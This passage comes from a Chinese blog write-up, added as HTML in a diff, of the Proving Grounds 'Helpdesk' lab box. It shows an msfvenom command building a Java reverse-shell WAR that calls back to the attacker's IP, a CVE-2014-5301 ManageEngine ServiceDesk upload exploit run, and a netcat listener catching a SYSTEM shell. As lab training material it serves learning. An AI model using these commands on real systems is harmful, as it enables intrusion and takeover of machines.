+</span></span><span class="line"><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
+</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
+</span></span><span class="line"><span class="cl"><span class="n">Cookie</span><span class="o">:</span> <span class="l">JSESSIONID=2D805EDCF4BA886BE98027DA4AA04DE6; JSESSIONIDSSO=B426F21E2CB902688F345DBF470D7683</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>直接执行POC，返回报错找不到文件</p>
+<p><img loading="lazy" src="/posts/provinggrounds-helpdesk/resource/11-W-E-Helpdesk.assets/image-20231221004920998.png" alt="image-20231221004920998" srcset="/posts/provinggrounds-helpdesk/resource/11-W-E-Helpdesk.assets/image-20231221004920998.png?size=small, /posts/provinggrounds-helpdesk/resource/11-W-E-Helpdesk.assets/image-20231221004920998.png?size=medium 1.5x, /posts/provinggrounds-helpdesk/resource/11-W-E-Helpdesk.assets/image-20231221004920998.png?size=large 2x" data-title="image-20231221004920998" style="--width: 2534px;--aspect-ratio: 2534 / 880;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>尝试写webshell失败，jsp无法执行</p>
+<p>尝试其他漏洞：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ msfvenom -p java/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>192.168.45.232 <span class="nv">LPORT</span><span class="o">=</span><span class="m">80</span> -f war -o shell.war
+</span></span><span class="line"><span class="cl">Payload size: <span class="m">13323</span> bytes
+</span></span><span class="line"><span class="cl">Final size of war file: <span class="m">13323</span> bytes
+</span></span><span class="line"><span class="cl">Saved as: shell.war
+</span></span><span class="line"><span class="cl">                                                                                                     
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ python3 cve-2014-5301.py 192.168.244.43 <span class="m">8080</span> administrator administrator shell.war  
+</span></span><span class="line"><span class="cl">Trying http://192.168.244.43:8080/5KF7BB1owtfPSmLhIyI7IvsioF80YhEQ/jjehycsuozbubil/D9zMMp8eubDUm04P</span></span></code></pre></td></tr></table>
+</div>
+</div><p>利用脚本：<a href="https://github.com/PeterSufliarsky/exploits/blob/master/CVE-2014-5301.py"target="_blank" rel="external nofollow noopener noreferrer">CVE-2014-5301 ManageEngine ServiceDesk Plus 7.6.0 Arbitrary File Upload</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice]
+</span></span><span class="line"><span class="cl">└─$ nc -nlvp 80  
+</span></span><span class="line"><span class="cl">listening on [any] 80 ...
+</span></span><span class="line"><span class="cl">connect to [192.168.45.232] from (UNKNOWN) [192.168.244.43] 49196
+</span></span><span class="line"><span class="cl">Microsoft Windows [Version 6.0.6001]
+</span></span><span class="line"><span class="cl">Copyright (c) 2006 Microsoft Corporation.  All rights reserved.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">C:\ManageEngine\ServiceDesk\bin&gt;whoami
+</span></span><span class="line"><span class="cl">whoami
+</span></span><span class="line"><span class="cl">nt authority\system
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">C:\Users&gt;type administrator\desktop\proof.txt
+</span></span><span class="line"><span class="cl">type administrator\desktop\proof.txt
+</span></span><span class="line"><span class="cl">362343a6e1593e22b5f3a58cdef9f423</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="/posts/provinggrounds-helpdesk/resource/11-W-E-Helpdesk.assets/image-20231221014337969.png" alt="image-20231221014337969" srcset="/posts/provinggrounds-helpdesk/resource/11-W-E-Helpdesk.assets/image-20231221014337969.png?size=small, /posts/provinggrounds-helpdesk/resource/11-W-E-Helpdesk.assets/image-20231221014337969.png?size=medium 1.5x, /posts/provinggrounds-helpdesk/resource/11-W-E-Helpdesk.assets/image-20231221014337969.png?size=large 2x" data-title="image-20231221014337969" style="--width: 2836px;--aspect-ratio: 2836 / 1082;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h2 id="pe" class="heading-element"><span>PE</span>
+  <a href="#pe" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>无需提权</p>
+<h2 id="sum-up" class="heading-element"><span>Sum up</span>
+  <a href="#sum-up" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><ul>
+<li>登录口，找下默认密码</li>
+<li>不要太依赖searchsploit，里面漏洞不全</li>
+<li>多利用搜索引擎，Google的搜索效果最好</li>
+<li>多利用github搜索漏洞EXP</li>
+</ul>
+</div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="更新于 2023-12-20 17:54:28">更新于 2023-12-20&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span></span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/oscp/" class="post-tag" title="标签 - OSCP">OSCP</a><a href="/tags/pg_practice/" class="post-tag" title="标签 - PG_Practice">PG_Practice</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+    </section>
+  </div><div class="post-nav"><a href="/posts/provinggrounds-planetexpress/" class="post-nav-item" rel="prev" title="ProvingGrounds PlanetExpress Writeup"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>ProvingGrounds PlanetExpress Writeup</a><a href="/posts/provinggrounds-exghost/" class="post-nav-item" rel="next" title="ProvingGrounds Exghost Writeup">ProvingGrounds Exghost Writeup<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="目录"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content always-active" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line visitor">
+          <span id="busuanzi_container_site_uv" title='总访客数'><i class="fa-regular fa-user fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='总访问量'><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
+        </div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
+        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">该网站在启用 JavaScript 的情况下效果最佳。</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/twemoji/twemoji.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":20},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"search":{"distance":100,"findAllMatches":false,"fuseIndexURL":"/search.json","highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"没有找到结果","snippetLength":30,"threshold":0.3,"type":"fuse","useExtendedSearch":false},"twemoji":true,"version":"v0.3.16"};console.log('Page config:', window.config);</script><script src="/js/theme.min.js" defer></script></body>
+</html>
